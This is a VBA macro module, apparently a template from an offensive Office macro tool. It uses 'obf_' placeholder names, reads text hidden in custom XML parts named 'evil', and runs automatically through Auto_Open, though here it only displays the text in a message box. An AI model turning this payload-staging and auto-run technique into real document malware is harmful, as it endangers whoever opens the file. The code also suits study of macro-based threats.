Function obf_GetCustomXMLPart(ByVal obf_Name As String) As Object
    Dim obf_part
    Dim obf_parts
    
    On Error Resume Next
    Set obf_parts = ActivePresentation.CustomXMLParts
    Set obf_parts = ActiveDocument.CustomXMLParts
    Set obf_parts = ThisWorkbook.CustomXMLParts
    
    For Each obf_part In obf_parts
        If obf_part.SelectSingleNode("/*").BaseName = obf_Name Then
            Set obf_GetCustomXMLPart = obf_part
            Exit Function
        End If
    Next
        
    Set obf_GetCustomXMLPart = Nothing
End Function

Function obf_GetCustomXMLPartTextSingle(ByVal obf_Name As String) As String
    Dim obf_part
    Dim obf_out, obf_m, obf_n
    
    Set obf_part = obf_GetCustomXMLPart(obf_Name)
    If obf_part Is Nothing Then
        obf_GetCustomXMLPartTextSingle = ""
    Else
        obf_out = obf_part.DocumentElement.Text
        obf_n = Len(obf_out) - 2 * Len(obf_Name) - 5
        obf_m = Len(obf_Name) + 3
        If Mid(obf_out, 1, 1) = "<" And Mid(obf_out, Len(obf_out), 1) = ">" And Mid(obf_out, obf_m - 1, 1) = ">" Then
            obf_out = Mid(obf_out, obf_m, obf_n)
        End If
        obf_GetCustomXMLPartTextSingle = obf_out
    End If
End Function

Function obf_GetCustomPart(ByVal obf_Name As String) As String
    On Error GoTo obf_ProcError

    Dim obf_tmp, obf_j
    Dim obf_part
    obf_j = 0
    
    Set obf_part = obf_GetCustomXMLPart(obf_Name & "_" & obf_j)
    While Not obf_part Is Nothing
        obf_tmp = obf_tmp & obf_GetCustomXMLPartTextSingle(obf_Name & "_" & obf_j)
        obf_j = obf_j + 1
        Set obf_part = obf_GetCustomXMLPart(obf_Name & "_" & obf_j)
    Wend
    
    If Len(obf_tmp) = 0 Then
        obf_tmp = obf_GetCustomXMLPartTextSingle(obf_Name)
    End If
    
    obf_GetCustomPart = obf_tmp
    
obf_ProcError:
End Function

Sub Auto_Open()
    Dim obf_text

    obf_text = obf_GetCustomPart("evil")
    MsgBox obf_text
End Sub


